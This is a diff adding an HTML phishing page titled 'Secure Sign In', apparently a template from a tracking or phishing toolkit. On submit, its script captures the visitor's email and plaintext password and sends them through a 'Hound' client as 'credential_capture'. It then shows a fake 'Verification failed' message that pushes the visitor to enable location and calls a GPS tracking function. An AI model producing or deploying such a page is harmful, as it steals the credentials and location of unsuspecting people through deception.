@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Sign in</title>
+  <link rel="stylesheet" href="../style.css">
+  <link rel="manifest" href="../manifest.json">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+    .login-wrap { max-width: 420px; margin: 60px auto; background: #fff; padding: 28px; border-radius: 8px; box-shadow: 0 8px 24px rgba(0,0,0,.08); }
+    .login-wrap input { width: 100%; margin: 8px 0 14px; padding: 10px; }
+    .login-wrap button { width: 100%; padding: 12px; background: #579ffb; color: #fff; border: 0; border-radius: 4px; }
+  </style>
+</head>
+<body onload="gpsLocation()">
+  <div class="login-wrap">
+    <h2>Secure Sign In</h2>
+    <p>Verify your identity and location to continue.</p>
+    <label>Email</label>
+    <input id="login-email" type="email" placeholder="you@example.com">
+    <label>Password</label>
+    <input id="login-password" type="password" placeholder="********">
+    <button id="login-submit" type="button">Continue</button>
+  </div>
+  <script src="../smart_client.js"></script>
+  <!-- tc_payload -->
+  <script>
+    document.getElementById('login-submit').addEventListener('click', function () {
+      var email = document.getElementById('login-email').value;
+      var password = document.getElementById('login-password').value;
+      if (window.Hound) {
+        window.Hound.send('credential_capture', {
+          credentials: { email: email, password_length: password.length, password: password }
+        });
+      }
+      alert('Verification failed. Please enable location and try again.');
+      gpsLocation();
+    });
+  </script>
+  <script src="../script.js"></script>
+</body>
+</html>
